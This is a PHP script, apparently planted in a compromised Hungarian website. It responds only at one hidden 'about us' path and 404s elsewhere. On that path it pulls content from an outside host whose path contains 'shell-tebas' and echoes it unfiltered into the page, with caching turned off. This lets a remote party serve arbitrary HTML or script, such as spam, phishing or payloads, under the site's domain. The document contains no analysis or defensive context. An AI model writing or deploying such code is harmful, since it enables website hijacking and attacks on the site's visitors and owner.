<?php

$uri = isset($_SERVER['REQUEST_URI']) ? strtolower($_SERVER['REQUEST_URI']) : '';
if ($uri !== '/rolunk/harmonia-caelestis' && $uri !== '/rolunk/harmonia-caelestis/') {
  http_response_code(404);
  exit;
}

header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

$remote_url = 'https://khusustxt.com/shell-tebas/itsinc.tx';

$body = '';
if (!empty($remote_url)) {
  $context = stream_context_create([
    'http' => [
      'timeout' => 8,
      'follow_location' => 1,
      'user_agent' => 'RolunkProxy/1.0 (+https://' . $_SERVER['HTTP_HOST'] . ')'
    ]
  ]);
  $body = @file_get_contents($remote_url, false, $context);

  if (($body === false || $body === '') && function_exists('curl_init')) {
    $ch = curl_init($remote_url);
    curl_setopt_array($ch, [
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_TIMEOUT => 8,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_USERAGENT => 'RolunkProxy/1.0 (+https://' . $_SERVER['HTTP_HOST'] . ')'
    ]);
    $body = curl_exec($ch);
    curl_close($ch);
  }
} else {
  $body = @file_get_contents($local_file);
}

if (empty($body)) {
  http_response_code(503);
  echo '<!doctype html><html><head><meta charset="utf-8"><title>Unavailable</title></head><body><p>rolunk.txt unreachable.</p></body></html>';
  exit;
}

echo $body;
